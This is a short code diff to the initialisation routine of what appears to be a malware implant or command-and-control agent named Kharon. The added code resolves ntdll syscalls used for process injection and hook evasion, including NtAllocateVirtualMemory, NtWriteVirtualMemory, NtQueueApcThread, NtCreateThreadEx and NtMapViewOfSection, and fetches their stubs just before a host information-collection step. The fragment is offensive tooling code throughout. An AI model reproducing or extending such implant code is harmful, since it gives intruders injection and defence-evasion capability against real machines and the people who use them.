@@ -102,7 +102,22 @@ auto DECLFN Kharon::Init(
     KhDbgz( "library cryptbase.dll loaded at %p and functions resolveds", Cryptbase.Handle );
     KhDbgz( "library ws2_32.dll    loaded at %p and functions resolveds", Ws2_32.Handle    );
 
-    // /* ========= [ informations collection ] ========= */
+    /* ========= [ Syscalls Setup ] ========= */
+    Sys->Ext[syAlloc].Address    = U_PTR( Ntdll.NtAllocateVirtualMemory );
+    Sys->Ext[syWrite].Address    = U_PTR( Ntdll.NtWriteVirtualMemory );
+    Sys->Ext[syOpenProc].Address = U_PTR( Ntdll.NtOpenProcess );
+    Sys->Ext[syOpenThrd].Address = U_PTR( Ntdll.NtOpenThread );
+    Sys->Ext[syQueueApc].Address = U_PTR( Ntdll.NtQueueApcThread );
+    Sys->Ext[syProtect].Address  = U_PTR( Ntdll.NtProtectVirtualMemory );
+    Sys->Ext[syCrThread].Address = U_PTR( Ntdll.NtCreateThreadEx );
+    Sys->Ext[syCrSectn].Address  = U_PTR( Ntdll.NtCreateSection );
+    Sys->Ext[syMapView].Address  = U_PTR( Ntdll.NtMapViewOfSection );
+
+    for ( INT i = 0; i < syLast -1; i++ ) {
+        Sys->Fetch( i );
+    }
+
+    /* ========= [ informations collection ] ========= */
     CHAR   cProcessorName[MAX_PATH] = { 0 };
 
     ULONG  TmpVal       = 0;
